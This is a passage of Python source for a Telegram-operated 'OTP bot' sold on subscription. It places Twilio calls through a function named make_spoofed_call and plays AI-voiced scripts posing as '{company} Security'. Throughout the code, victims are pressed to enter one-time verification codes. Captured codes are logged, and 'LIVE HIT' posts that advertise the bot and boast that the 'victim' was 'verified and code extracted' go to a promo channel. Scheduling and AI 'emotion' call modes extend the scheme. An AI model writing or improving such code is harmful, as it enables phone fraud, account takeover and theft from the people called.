            if r.status_code == 200 and r.content and len(r.content) > 128:
                return r.content
            logger.debug(f"Invalid Twilio recording response for {call_sid}: status={r.status_code} size={len(r.content) if r.content else 0}")
            time.sleep(delay)
    except Exception as e:
        logger.warning(f"Error fetching Twilio recording for {call_sid}: {e}")
    return None


def send_call_stage_status(chat_id, stage, text):
    if not chat_id:
        return
    try:
        bot.send_message(chat_id, f"ℹ️ {text}")
    except Exception as e:
        logger.debug(f"Failed to send call stage status: {e}")


def _resolve_vouch_mode(session: Optional[dict]) -> str:
    if not session:
        return "Unknown"
    mode_label = session.get("mode_label")
    if mode_label:
        return mode_label
    campaign = session.get("campaign")
    if campaign and str(campaign).upper() == "CRACK BLAST":
        return "Crack Blast"
    endpoints = [str(endpoint).lower() for endpoint in session.get("endpoints_hit", []) if endpoint]
    if "/custom_flow" in endpoints:
        return "Custom Call"
    if "/manual_flow" in endpoints:
        return "Manual Calling"
    if "/focus_listen_flow" in endpoints and "/normal_advanced_flow" in endpoints:
        return "Normal Call"
    if "/focus_listen_flow" in endpoints:
        return "Fast Mode"
    if "/normal_advanced_flow" in endpoints:
        return "Normal Call"
    if "/voice" in endpoints:
        return "AI Mode"
    if "/initiate_normal_call" in endpoints:
        return "Normal Call"
    return "Unknown"


def post_vouch_to_channel(call_sid: str, user_id: str, otp: str, override_service: Optional[str] = None, override_mode: Optional[str] = None) -> bool:
    channel = VOUCH_CHANNEL_ID.strip()
    if not channel:
        logger.debug("VOUCH_CHANNEL_ID not set; skipping vouch post.")
        return False

    service_name = override_service or read_user_file(user_id, "Company Name.txt", "")
    if not service_name or service_name.strip().lower() in ("", "your company", "unknown service"):
        service_name = read_user_file(user_id, "Name.txt", "Unknown Service")
    service_name = service_name.strip() or "Unknown Service"

    mode = override_mode or _resolve_vouch_mode(call_sessions.get(call_sid))
    hit_id = uuid.uuid4().hex[:4].upper()
    now = datetime.utcnow()
    time_str = now.strftime("%H:%M UTC")
    date_str = now.strftime("%d/%m/%Y")

    message = (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 LIVE HIT #HTZ-{hit_id}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 TARGET: {html.escape(service_name)}\n"
        f"🤖 MODE: {html.escape(mode)}\n"
        f"📱 STATUS: ✅ CODE CRACKED\n"
        f"🔑 OTP: {html.escape(otp)}\n"
        f"⏱️ CAPTURED: {time_str}\n"
        f"📅 DATE: {date_str}\n\n"
        f'💬 "Victim verified and code extracted successfully."\n'
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚡ Access The Bot @Hittz_OTPbot"
    )

    try:
        target_chat = int(channel) if re.fullmatch(r"-?\d+", channel) else channel
        bot.send_message(target_chat, message, parse_mode="HTML", disable_web_page_preview=True)
        logger.info(f"✅ Vouch posted for OTP {otp} (Hit #{hit_id})")
        return True
    except Exception as e:
        logger.error(f"❌ Failed to post vouch: {e}")
        return False


def log_otp(call_sid, digits, status):
    """Log OTP to file for audit."""
    log_path = Path("conf") / "otp_log.txt"
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(f"{datetime.now().isoformat()} | {call_sid} | {digits} | {status}\n")

# ======================================================================
# AUTH & SUBSCRIPTION
# ======================================================================
def is_privileged_user(user_id: str) -> bool:
    uid = int(user_id)
    if OWNER_ID is not None and uid == OWNER_ID:
        return True
    if ADMIN_ID is not None and uid == ADMIN_ID:
        return True
    if uid in DEVELOPER_IDS:
        return True
    return False

def is_developer_user(user_id: str) -> bool:
    try:
        return int(user_id) in DEVELOPER_IDS
    except Exception:
        return False


def _parse_subscription_expiry(expiry_str: str) -> Optional[datetime]:
    if not expiry_str:
        return None
    cleaned = expiry_str.strip()
    upper_cleaned = cleaned.upper()
    if upper_cleaned in {"LIFETIME", "UNLIMITED"}:
        return None
    for fmt in ("%d/%m/%Y %H:%M", "%d/%m/%Y", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f"):
        try:
            return datetime.strptime(cleaned, fmt)
        except ValueError:
            continue
    return None


def _format_subscription_display(dt: datetime) -> str:
    if dt is None:
        return ""
    if dt.time() != datetime.min.time():
        return dt.strftime("%d/%m/%Y %H:%M")
    return dt.strftime("%d/%m/%Y")


def get_current_subscription_end(user_id: str) -> Optional[datetime]:
    try:
        if is_premium(user_id):
            db_expiry = get_subscription_end_date(user_id)
            dt = _parse_subscription_expiry(db_expiry or "")
            if dt is not None:
                return dt
    except Exception:
        pass
    expiry_str = read_user_file(user_id, "subs.txt", "")
    return _parse_subscription_expiry(expiry_str)


def apply_premium_subscription(target_user_id: str, duration_key: str) -> tuple[bool, str, str, int, bool, Optional[str]]:
    duration_map = {
        "3h": 0.125,
        "1d": 1,
        "3d": 3,
        "7d": 7,
        "30d": 30,
        "90d": 90,
        "lifetime": "LIFETIME",
        "1": 1,
        "3": 3,
        "7": 7,
        "30": 30,
        "90": 90,
        "unlimited": "LIFETIME",
    }
    if duration_key not in duration_map:
        return False, "Invalid duration.", "", 0, False, None

    duration_value = duration_map[duration_key]
    now = datetime.now()
    expiry_str = ""
    display_duration = ""
    db_success = False
    if duration_value == "LIFETIME":
        expiry_str = "LIFETIME"
        display_duration = "LIFETIME"
        db_success = set_user_premium(target_user_id, is_premium=True, days_duration=9999)
    else:
        current_end = get_current_subscription_end(target_user_id)
        start = current_end if current_end and current_end > now else now
        if duration_value == 0.125:
            expiry = start + timedelta(hours=3)
            display_duration = "3 hours"
        else:
            expiry = start + timedelta(days=duration_value)
            display_duration = f"{int(duration_value)} day(s)"
        expiry_str = expiry.strftime("%d/%m/%Y %H:%M")
        db_success = set_user_subscription_end_date(target_user_id, expiry, role="premium")

    write_user_file(target_user_id, "subs.txt", expiry_str)
    if not db_success:
        logger.warning(f"⚠️ Failed to update PostgreSQL subscription for {target_user_id}")

    purchase_count = increment_purchase_count(target_user_id, 1)
    loyalty_gift_awarded = False
    loyalty_key_token = None
    if purchase_count % 5 == 0:
        gift_count = increment_loyalty_gift_count(target_user_id, 1)
        loyalty_gift_awarded = True
        loyalty_key = {
            "token": secrets.token_urlsafe(16).upper(),
            "days": 1,
            "created_by": "PAYMENT_LOYALTY_SYSTEM",
            "created_at": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
            "used": False,
            "claimed_by": target_user_id,
            "type": "LOYALTY_GIFT_AUTO",
        }
        keys = load_premium_keys()
        keys.append(loyalty_key)
        save_premium_keys(keys)
        loyalty_key_token = loyalty_key["token"]
        write_user_file(target_user_id, "purchase_count.txt", "0")
        logger.info(f"✅ Loyalty gift awarded to {target_user_id}: {gift_count} gifts | Auto key: {loyalty_key_token}")

    return True, expiry_str, display_duration, purchase_count, loyalty_gift_awarded, loyalty_key_token


def is_premium_user(user_id: str) -> bool:
    """Return True when the user has active premium access or is privileged."""
    if is_privileged_user(user_id):
        return True
    return check_subscription(user_id) == "ACTIVE"


def is_full_premium_user(user_id: str) -> bool:
    """Return True only for full paid premium users (not key-scoped grants).

    This allows scoping keys to limited features (e.g., Normal Call only) by
    differentiating `role` values in the database. Privileged users always
    qualify as full premium.
    """
    if is_privileged_user(user_id):
        return True
    try:
        info = get_user_info(user_id)
        if not info:
            return False
        return info.get("role") == "premium"
    except Exception:
        return False


def notify_premium_required(chat_id: int, message: str, callback_id: Optional[str] = None) -> None:
    """Send the user a premium upgrade notice."""
    if callback_id:
        try:
            bot.answer_callback_query(callback_id, message, show_alert=True)
            return
        except Exception:
            pass
    try:
        bot.send_message(chat_id, message, parse_mode="HTML")
    except Exception:
        pass


def check_subscription(user_id: str) -> str:
    """Check if user has active subscription (checks database first, then legacy files)."""
    if is_privileged_user(user_id):
        return "ACTIVE"
    
    # Check new database system first
    if is_premium(user_id):
        return "ACTIVE"
    
    # Fallback to legacy file-based system
    expiry_str = read_user_file(user_id, "subs.txt", "")
    if not expiry_str:
        return "EXPIRED"
    try:
        expiry = datetime.strptime(expiry_str, "%d/%m/%Y")
        return "ACTIVE" if expiry >= datetime.now() else "EXPIRED"
    except:
        return "EXPIRED"

from core.files import get_master_free_calls, set_master_free_calls

def get_free_calls(user_id: str) -> int:
    try:
        master = get_master_free_calls(user_id)
        if master is not None:
            return int(master)
        return int(read_user_file(user_id, "free_calls.txt", "0"))
    except:
        return 0

def set_free_calls(user_id: str, count: int) -> None:
    try:
        set_master_free_calls(user_id, int(count))
    except Exception:
        pass
    write_user_file(user_id, "free_calls.txt", str(int(count)))

def decrement_free_call(user_id: str) -> int:
    remaining = get_free_calls(user_id)
    remaining = max(0, remaining - 1)
    set_free_calls(user_id, remaining)
    return remaining

def get_purchase_count(user_id: str) -> int:
    try:
        return int(read_user_file(user_id, "purchase_count.txt", "0"))
    except:
        return 0

def increment_purchase_count(user_id: str, amount: int = 1) -> int:
    current = get_purchase_count(user_id)
    new = max(0, current + amount)
    write_user_file(user_id, "purchase_count.txt", str(new))
    return new

def get_loyalty_gift_count(user_id: str) -> int:
    """Get admin-approved loyalty gift count (only incremented when admins approve users)"""
    try:
        return int(read_user_file(user_id, "loyalty_gift_count.txt", "0"))
    except:
        return 0

def increment_loyalty_gift_count(user_id: str, amount: int = 1) -> int:
    """Increment loyalty gift count (ONLY ADMINS can trigger this via user approval)"""
    current = get_loyalty_gift_count(user_id)
    new = max(0, current + amount)
    write_user_file(user_id, "loyalty_gift_count.txt", str(new))
    logger.info(f"✅ Loyalty gift awarded to user {user_id}: {new} total gifts")
    return new

def get_user_role_text(user_id: str) -> str:
    uid = int(user_id)
    if OWNER_ID is not None and uid == OWNER_ID:
        return "ADMIN OWNER"
    if ADMIN_ID is not None and uid == ADMIN_ID:
        return "ADMIN"
    if uid in DEVELOPER_IDS:
        return "DEVELOPER"
    if check_subscription(user_id) == "ACTIVE":
        return "PREMIUM USER"
    return "FREE USER"

def get_panel_status_text(user_id: str) -> str:
    role = get_user_role_text(user_id)
    if is_privileged_user(user_id):
        return (
            f"🛡️ Role: {role}\n"
            "💎 Plan: PREMIUM\n"
            "⏳ Subscription: Unlimited\n"
            "⚡ Free calls: Unlimited"
        )
    
    # Check subscription status from database
    sub_status = check_subscription(user_id)
    logger.debug(f"📊 Premium check for {user_id}: {sub_status}")
    
    if sub_status == "ACTIVE":
        # Get subscription end date from database (new system)
        expiry = get_subscription_end_date(user_id)
        if not expiry:
            # Fallback to file-based system for legacy users
            expiry = read_user_file(user_id, "subs.txt", "Unknown")
        
        logger.info(f"✅ User {user_id} is PREMIUM - expires: {expiry}")
        return (
            f"🛡️ Role: {role}\n"
            f"💎 Plan: PREMIUM\n"
            f"⏳ Subscription: Active until <b>{expiry}</b>\n"
            "⚡ Free calls: Unlimited"
        )
    
    remaining = get_free_calls(user_id)
    if remaining > 0:
        return (
            f"🛡️ Role: {role}\n"
            "💸 Plan: FREE\n"
            "⏳ Subscription: No active subscription\n"
            f"⚡ Free calls remaining: {remaining}/{FREE_TRIAL_TOTAL}"
        )
    return (
        f"🛡️ Role: {role}\n"
        "💸 Plan: FREE\n"
        "⏳ Subscription: No active subscription\n"
        "⚠️ Free trial ended. Buy a subscription to continue!"
    )

# ======================================================================
# PREMIUM KEY MANAGEMENT
# ======================================================================
def get_premium_key_store_path() -> Path:
    return Path("conf") / "premium_keys.json"

def load_premium_keys() -> list:
    path = get_premium_key_store_path()
    if not path.exists():
        return []
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return []

def save_premium_keys(keys: list) -> None:
    with open(get_premium_key_store_path(), "w", encoding="utf-8") as f:
        json.dump(keys, f, indent=2)

def generate_premium_key(days: int, created_by: str) -> dict:
    token = "".join(secrets.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(12))
    key = {
        "token": token,
        "days": days,
        "created_by": created_by,
        "created_at": datetime.now().strftime("%d/%m/%Y %H:%M:%S"),
        "used": False,
        "used_by": None,
        "used_at": None,
    }
    keys = load_premium_keys()
    keys.append(key)
    save_premium_keys(keys)
    return key

def find_premium_key(token: str) -> Optional[dict]:
    token = token.strip().upper()
    for key in load_premium_keys():
        if key.get("token") == token:
            return key
    return None

def redeem_premium_key(user_id: str, token: str) -> tuple:
    token = token.strip().upper()
    keys = load_premium_keys()
    for key in keys:
        if key.get("token") == token:
            if key.get("used"):
                return False, "Key already used."
            days = key.get("days", 0)
            expiry = datetime.now()
            if check_subscription(user_id) == "ACTIVE":
                current_exp = read_user_file(user_id, "subs.txt", "")
                try:
                    current = datetime.strptime(current_exp, "%d/%m/%Y")
                    expiry = max(expiry, current)
                except:
                    pass
            expiry += timedelta(days=days)
            write_user_file(user_id, "subs.txt", expiry.strftime("%d/%m/%Y"))
            key["used"] = True
            key["used_by"] = user_id
            key["used_at"] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            save_premium_keys(keys)
            return True, expiry.strftime("%d/%m/%Y")
    return False, "Key not found."

def get_unused_premium_keys() -> list:
    return [k for k in load_premium_keys() if not k.get("used")]

# ======================================================================
# PROFESSIONAL SCRIPT BUILDER (PayPal-style with A/B testing)
# ======================================================================

def build_script(user_id: str, digits: int = 6) -> str:
    """
    Generate a single professional Normal Call script.
    This flow uses one focused verification path for human answers.
    """
    name = read_user_file(user_id, "Name.txt", "Customer")
    company = read_user_file(user_id, "Company Name.txt", "your bank")

    return (
        "[GREETING]\n"
        f"Hello, this is {company} Security. May I speak with {name}?\n\n"
        "We are calling to verify a recent activity on your account and ensure everything is secure.\n\n"
        "[PAUSE_WAIT:1]\n"
        "For your protection, please press 1 to continue.\n\n"
        f"[GATHER:digits={digits}]\n"
        f"A verification code has been sent to your registered phone number. Enter the {digits}-digit code now, then press the pound key.\n\n"
        "[SUCCESS]\n"
        "Thank you. Your account is now verified and secure. Goodbye.\n\n"
        "[FAILURE]\n"
        "The code did not match our records. Please try again."
    )


def format_call_summary(user_id: str) -> str:
    """Build the CALL READY summary with all details."""
    name = read_user_file(user_id, "Name.txt", "Not set")
    company = read_user_file(user_id, "Company Name.txt", "Not set")
    phone = read_user_file(user_id, "phonenum.txt", "Not set")
    caller_id = read_user_file(user_id, "Caller ID.txt", "Default")
    from_name = read_user_file(user_id, "From Name.txt", "Not set")
    lang = read_user_file(user_id, "Language.txt", "en").upper()
    delivery = read_user_file(user_id, "Delivery.txt", "sms").upper()
    digits = read_user_file(user_id, "Digits.txt", "6")
    voice_name = read_user_file(user_id, "VoiceName.txt", "Default")
    return (
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔱 CALL READY — NORMAL CALL 🔱\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 Target: {name}\n"
        f"🏢 Company: {company}\n"
        f"📞 Phone: {phone}\n"
        f"📞 Caller ID: {caller_id}\n"
        f"📛 Display: {from_name}\n"
        f"🌐 Language: {lang}\n"
        f"📨 Delivery: {delivery}\n"
        f"🔢 OTP Length: {digits} digits\n"
        f"🎙️ Voice: {voice_name}\n"
    )


def get_normal_script_for_preview(user_id: str) -> str:
    """Get a script variant for preview display."""
    digits = int(read_user_file(user_id, "Digits.txt", "6"))
    script = build_script(user_id, digits)
    # Truncate for preview
    if len(script) > 300:
        return script[:300] + "..."
    return script


# ======================================================================
# AUDIO GENERATION - SIMPLIFIED
# All audio is now generated on-demand in the /voice endpoint using generate_call_audio()


def get_audio_url(user_id: str, filename: str) -> str:
    return f"{NGROK_URL.rstrip('/')}/audio?user_id={quote_plus(str(user_id))}&file={quote_plus(filename)}"


def _run_with_timeout(func, args=(), kwargs=None, timeout=15):
    kwargs = kwargs or {}
    result = [None]
    error = [None]
    done = [False]

    def _target():
        try:
            result[0] = func(*args, **kwargs)
        except Exception as e:
            error[0] = e
        finally:
            done[0] = True

    t = threading.Thread(target=_target, daemon=True)
    t.start()
    t.join(timeout)
    if not done[0]:
        return None
    if error[0]:
        raise error[0]
    return result[0]

def generate_call_audio(
    user_id: str,
    text: str,
    voice_id: str,
    filename: str = "call_audio.mp3",
    max_retries: int = 1
) -> Optional[str]:
    if not ELEVENLABS_API_KEY:
        logger.error("ElevenLabs API key not configured")
        return None

    models_to_try = [ELEVENLABS_MODEL or "eleven_turbo_v2", "eleven_flash_v2_5"]
    voices_to_try = [voice_id]
    default_voice = get_default_voice_id()
    if default_voice and default_voice not in voices_to_try:
        voices_to_try.append(default_voice)
    client = eleven_client
    if client is None:
        from elevenlabs.client import ElevenLabs
        client = ElevenLabs(api_key=ELEVENLABS_API_KEY)

    output_path = user_conf_path(user_id) / filename
    ensure_user_path(user_id)
    try:
        if output_path.exists() and output_path.stat().st_size > 1024:
            return get_audio_url(user_id, filename)
    except Exception:
        pass

    for attempt in range(max_retries + 1):
        for model in models_to_try:
            for vid in voices_to_try:
                try:
                    gen = _run_with_timeout(
                        client.text_to_speech.convert,
                        kwargs={
                            "voice_id": vid,
                            "model_id": model,
                            "text": text,
                            "output_format": "mp3_44100_128",
                        },
                        timeout=12
                    )
                    if gen is None:
                        logger.debug(f"Audio timeout ({vid}/{model})")
                        continue

                    with open(output_path, "wb") as f:
                        for chunk in gen:
                            if chunk:
                                f.write(chunk)

                    audio_url = get_audio_url(user_id, filename)
                    logger.info(f"[OK] Audio generated voice={vid} model={model}: {audio_url}")
                    return audio_url

                except Exception as e:
                    err_msg = str(e)[:120] if str(e) else type(e).__name__
                    logger.debug(f"Audio fail ({vid}/{model}): {err_msg}")
                    continue
        if attempt < max_retries:
            time.sleep(0.5)

    logger.warning(f"Audio failed for voice_id={voice_id}, using fallback text")
    return None


def generate_call_audio_batch(user_id: str, voice_id: str, items: list) -> None:
    results = [None] * len(items)
    def _gen(i, text, fname):
        results[i] = generate_call_audio(user_id=user_id, text=text, voice_id=voice_id, filename=fname)
    threads = []
    for i, (text, fname) in enumerate(items):
        t = threading.Thread(target=_gen, args=(i, text, fname), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join(timeout=15)


def add_prompt_to_gather(gather: Gather, user_id: str, filename: str, fallback_text: str) -> None:
    # Always try to play audio if user_id and filename are provided
    if user_id and filename:
        gather.play(get_audio_url(user_id, filename))
    else:
        gather.say(fallback_text)


def validate_live_listen_request() -> bool:
    if not LIVE_LISTEN_SECRET:
        return True
    token = request.headers.get("X-Live-Listen-Secret", "")
    return token == LIVE_LISTEN_SECRET

# ======================================================================
# CALLER ID SPOOFING
# ======================================================================
def _safe_caller_id(caller_id: Optional[str]) -> str:
    if not caller_id:
        return TWILIO_PHONE_NUMBER
    cleaned = caller_id.strip()
    if "1234567890" in cleaned:
        return TWILIO_PHONE_NUMBER
    return cleaned

def make_spoofed_call(to: str, from_number: str, caller_id: str, webhook_url: str, user_id: str,
                      chat_id: Optional[int] = None, call_record: bool = True, machine_detection: bool = True) -> Optional[str]:
    if not is_twilio_configured():
        logger.error("Twilio not configured")
        return None
    caller_id = _safe_caller_id(caller_id)
    try:
        if user_id:
            try:
                old_file = user_conf_path(user_id) / "record.mp3"
                if old_file.exists() and old_file.stat().st_size <= 128:
                    old_file.unlink()
            except Exception as cleanup_ex:
                logger.debug(f"Failed to clear stale record.mp3 for user {user_id}: {cleanup_ex}")

        amd_enabled = bool(machine_detection)
        amd_param = "DetectMessageEnd" if amd_enabled else None

        call_params = {
            "to": to,
            "from_": from_number,
            "url": webhook_url,
            "method": "POST",
        }
        # Call lifecycle and recording callbacks
        status_cb = f"{NGROK_URL.rstrip('/')}/twilio/status?user_id={quote_plus(str(user_id))}"
        if chat_id:
            status_cb += f"&chat_id={quote_plus(str(chat_id))}"
        call_params["status_callback"] = status_cb
        call_params["status_callback_method"] = "POST"
        rec_cb = f"{NGROK_URL.rstrip('/')}/twilio/recording?user_id={quote_plus(str(user_id))}"
        if chat_id:
            rec_cb += f"&chat_id={quote_plus(str(chat_id))}"
        call_params["recording_status_callback"] = rec_cb
        call_params["recording_status_callback_method"] = "POST"
        # Always record the call when outbound recording is requested.
        # This captures the full call audio and generates a Twilio recording URL
        # for the bot's recording callback.
        if call_record:
            call_params["record"] = True
            call_params["recording_channels"] = "mono"
            call_params["recording_status_callback_event"] = ["completed"]
        call_params["status_callback_event"] = ["queued", "ringing", "answered", "completed"]
        if amd_param:
            call_params["machine_detection"] = amd_param
            call_params["async_amd"] = True
            call_params["async_amd_status_callback"] = f"{NGROK_URL.rstrip('/')}/amd_callback?user_id={quote_plus(str(user_id))}"
            if chat_id:
                call_params["async_amd_status_callback"] += f"&chat_id={quote_plus(str(chat_id))}"

        if caller_id and caller_id != from_number:
            logger.warning(
                "Ignoring unsupported outbound caller_id override for Twilio call creation: from=%s caller_id=%s",
                from_number,
                caller_id,
            )

        # Dispatch call creation to background worker to avoid blocking Flask/Telegram threads
        # Use make_call_and_store_async so metadata is persisted without waiting here.
        try:
            fut = make_call_and_store_async(
                user_id=str(user_id),
                to=to,
                from_number=from_number,
                caller_id=caller_id,
                webhook_url=webhook_url,
                record=call_record,
                machine_detection=amd_param,
                async_amd=bool(amd_param),
                async_amd_status_callback=call_params.get("async_amd_status_callback"),
                target=to,
            )
            # If the caller expects a SID string, try to return quickly if available; otherwise return future
            try:
                sid = None
                if fut is not None:
                    sid = fut.result(timeout=0.5)
                return sid or fut
            except Exception:
                return fut
        except Exception as exc:
            logger.debug("Background call dispatch creation failed, falling back to direct call: %s", exc)
            try:
                call = asyncio.run(asyncio.to_thread(twilio_client.calls.create, **call_params))
                return call.sid
            except Exception as direct_exc:
                logger.error("Direct Twilio call creation fallback failed: %s", direct_exc)
                return None
    except TwilioRestException as e:
        twilio_error = {
            "status": getattr(e, "status", None),
            "code": getattr(e, "code", None),
            "msg": getattr(e, "msg", str(e)),
            "uri": getattr(e, "uri", None),
        }
        logger.error("Call failed: TwilioRestException %s", json.dumps({k: v for k, v in twilio_error.items() if v is not None}))
        logger.debug("Twilio call params: %s", {k: v for k, v in call_params.items() if k != "url"})
        return None
    except Exception as e:
        logger.error("Call failed: %s", e)
        logger.debug("Twilio call params: %s", {k: v for k, v in call_params.items() if k != "url"})
        return None

def is_twilio_configured() -> bool:
    if not ACCOUNT_SID or "YOUR_" in ACCOUNT_SID:
        return False
    if not AUTH_TOKEN or "YOUR_" in AUTH_TOKEN:
        return False
    if not TWILIO_PHONE_NUMBER or "1234567890" in TWILIO_PHONE_NUMBER:
        return False
    if not NGROK_URL or "your-ngrok-url" in NGROK_URL:
        return False
    return NGROK_URL.startswith("http")

# ======================================================================
# CARRIER LOOKUP
# ======================================================================
def lookup_carrier(phone_number: str) -> Dict[str, Any]:
    if not ABSTRACT_API_KEY:
        return {"carrier": "Unknown", "country": "Unknown", "line_type": "Unknown", "valid": False}
    try:
        url = f"https://phonevalidation.abstractapi.com/v1/?api_key={ABSTRACT_API_KEY}&phone={phone_number}"
        resp = _http.get(url, timeout=REQ_TIMEOUT)
        if resp.status_code == 200:
            data = resp.json()
            return {
                "carrier": data.get("carrier", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown"),
                "line_type": data.get("line_type", "Unknown"),
                "valid": data.get("valid", False)
            }
    except Exception as e:
        logger.error(f"Carrier lookup error: {e}")
    return {"carrier": "Unknown", "country": "Unknown", "line_type": "Unknown", "valid": False}

# ======================================================================
# CALL SCHEDULING
# ======================================================================
def schedule_call(user_id: str, phone: str, scheduled_time: datetime, emotion: str = "neutral") -> bool:
    schedule_path = user_conf_path(user_id) / "scheduled_calls.json"
    schedules = []
    if schedule_path.exists():
        try:
            schedules = json.loads(schedule_path.read_text())
        except:
            pass
    schedules.append({
        "phone": phone,
        "time": scheduled_time.isoformat(),
        "created": datetime.now().isoformat(),
        "user_id": user_id,
        "emotion": emotion,
        "type": "voice",
        "status": "pending",
        "sid": None,
    })
    schedule_path.write_text(json.dumps(schedules, indent=2))
    return True


def schedule_manual_call(
    user_id: str,
    phone: str,
    scheduled_time: datetime,
    manual_params: dict,
    chat_id: Optional[int] = None,
) -> bool:
    schedule_path = user_conf_path(user_id) / "scheduled_calls.json"
    schedules = []
    if schedule_path.exists():
        try:
            schedules = json.loads(schedule_path.read_text())
        except:
            pass
    schedules.append({
        "schedule_id": uuid.uuid4().hex,
        "phone": phone,
        "time": scheduled_time.isoformat(),
        "created": datetime.now().isoformat(),
        "user_id": user_id,
        "type": "manual",
        "manual_params": manual_params,
        "chat_id": chat_id,
        "status": "pending",
        "sid": None,
    })
    schedule_path.write_text(json.dumps(schedules, indent=2))
    return True


def schedule_custom_call(
    user_id: str,
    phone: str,
    scheduled_time: datetime,
    custom_params: dict,
    chat_id: Optional[int] = None,
) -> bool:
    schedule_path = user_conf_path(user_id) / "scheduled_calls.json"
    schedules = []
    if schedule_path.exists():
        try:
            schedules = json.loads(schedule_path.read_text())
        except:
            pass
    schedules.append({
        "schedule_id": uuid.uuid4().hex,
        "phone": phone,
        "time": scheduled_time.isoformat(),
        "created": datetime.now().isoformat(),
        "user_id": user_id,
        "type": "custom",
        "custom_params": custom_params,
        "chat_id": chat_id,
        "status": "pending",
        "sid": None,
    })
    schedule_path.write_text(json.dumps(schedules, indent=2))
    return True


def _load_scheduled_params(user_id: str, schedule_id: str) -> Optional[dict]:
    path = user_conf_path(user_id) / "scheduled_calls.json"
    if not path.exists():
        return None
    try:
        schedules = json.loads(path.read_text())
        for sched in schedules:
            if str(sched.get("schedule_id")) == str(schedule_id):
                return sched
    except Exception as e:
        logger.error(f"Failed to load scheduled params for {user_id}: {e}")
    return None


def initiate_emotion_call(chat_id: int, user_id_str: str, call_from_user, emotion: str = "neutral", status_message_id: Optional[int] = None) -> None:
    """Start an AI Emotion Call with specified emotion via Media Stream + Groq.
    
    Emotion options: neutral, cheerful, angry, fear, surprise
    Routes through /ai_start → Media Stream WebSocket → Groq with emotion-modulated responses
    """
    try:
        ensure_user_path(user_id_str)
        # Compute current setup hash to prevent reuse of a previously completed setup
        current_hash = _compute_setup_hash(user_id_str)
        last_hash = read_user_file(user_id_str, "last_setup_hash.txt", "").strip()
        if last_hash and current_hash and _has_completed_call(user_id_str) and last_hash == current_hash:
            bot.send_message(chat_id, "❌ This exact call setup was already used and completed. Please change at least one field before initiating another call.")
            return

        phonenum = normalize_phone_number(read_user_file(user_id_str, "phonenum.txt", ""))
        if not phonenum or not is_valid_e164(phonenum):
            bot.send_message(chat_id, "❌ Invalid or missing target phone number.")
            return

        caller_id = read_user_file(user_id_str, "Caller ID.txt", "").strip() or TWILIO_PHONE_NUMBER
        emotion = emotion.lower() if emotion else "neutral"
        bot.send_message(chat_id, f"🎭 Starting AI Emotion Call ({emotion}). Live listen will be available shortly.")

        def _start():
            try:
                from config import USE_AI_FLOW, DEFAULT_VOICE_ID
                
                name = read_user_file(user_id_str, "Name.txt", "Customer")
                company = read_user_file(user_id_str, "Company Name.txt", "your bank")
                voice_id = read_user_file(user_id_str, "Voice.txt", DEFAULT_VOICE_ID)
                code_length = read_user_file(user_id_str, "CodeLength.txt", "6")
                
                if USE_AI_FLOW:
                    webhook_url = (
                        f"{NGROK_URL.rstrip('/')}/ai_start"
                        f"?user_id={quote_plus(str(user_id_str))}"
                        f"&chat_id={quote_plus(str(chat_id))}"
                        f"&name={quote_plus(name)}"
                        f"&company={quote_plus(company)}"
                        f"&voice_id={quote_plus(voice_id)}"
                        f"&emotion={quote_plus(emotion)}"
                        f"&code_length={quote_plus(code_length)}"
                        f"&call_type=emotion"
                        f"&mode_label=AI%20Emotion%20Call"
                    )
                else:
                    bot.send_message(chat_id, "❌ AI flow is disabled. Cannot start emotion call.")
                    return
                
                sid = make_spoofed_call(
                    to=phonenum,
                    from_number=TWILIO_PHONE_NUMBER,
                    caller_id=caller_id,
                    webhook_url=webhook_url,
                    user_id=user_id_str,
                    chat_id=chat_id,
                    call_record=True,
                )
                if not sid:
                    raise Exception("Failed to create emotion call")

                resolved_sid = None
                try:
                    if hasattr(sid, "result") and callable(getattr(sid, "result")):
                        resolved_sid = sid.result(timeout=5)
                    else:
                        resolved_sid = sid
                except Exception:
                    resolved_sid = None

                user_obj = types.User(id=call_from_user.id, is_bot=False, first_name=read_user_file(user_id_str, "Name.txt") or "User")
                if resolved_sid:
                    register_call_session(
                        resolved_sid,
                        user_id_str,
                        chat_id=chat_id,
                        endpoint="/initiate_emotion_call",
                        mode_label=f"AI Emotion Call ({emotion})",
                        status_chat_id=chat_id,
                        status_message_id=status_message_id,
                    )
                    store_call_metadata(user_id_str, resolved_sid, target=phonenum)
                    live_buttons = types.InlineKeyboardMarkup(row_width=1)
                    live_buttons.add(types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"))
                    bot.send_message(chat_id, "🎯 Emotion call started. Tap LIVE LISTEN to open the monitoring panel.", reply_markup=live_buttons)
                    try:
                        _http.post(
                            f"{LIVE_LISTEN_URL}/conversation/start",
                            json={"call_sid": resolved_sid, "chat_id": chat_id},
                            timeout=REQ_TIMEOUT,
                        )
                    except Exception:
                        pass
                else:
                    bot.send_message(chat_id, "🎯 Emotion call queued. You'll be notified when it starts.")
                    try:
                        if hasattr(sid, "add_done_callback") and callable(getattr(sid, "add_done_callback")):
                            def _finalize_call(fut):
                                try:
                                    final_sid = fut.result()
                                except Exception:
                                    return
                                try:
                                    register_call_session(
                                        final_sid,
                                        user_id_str,
                                        chat_id=chat_id,
                                        endpoint="/initiate_emotion_call",
                                        mode_label=f"AI Emotion Call ({emotion})",
                                        status_chat_id=chat_id,
                                        status_message_id=status_message_id,
                                    )
                                except Exception:
                                    pass
                                try:
                                    store_call_metadata(user_id_str, final_sid, target=phonenum)
                                except Exception:
                                    pass
                                try:
                                    _http.post(
                                        f"{LIVE_LISTEN_URL}/conversation/start",
                                        json={"call_sid": final_sid, "chat_id": chat_id},
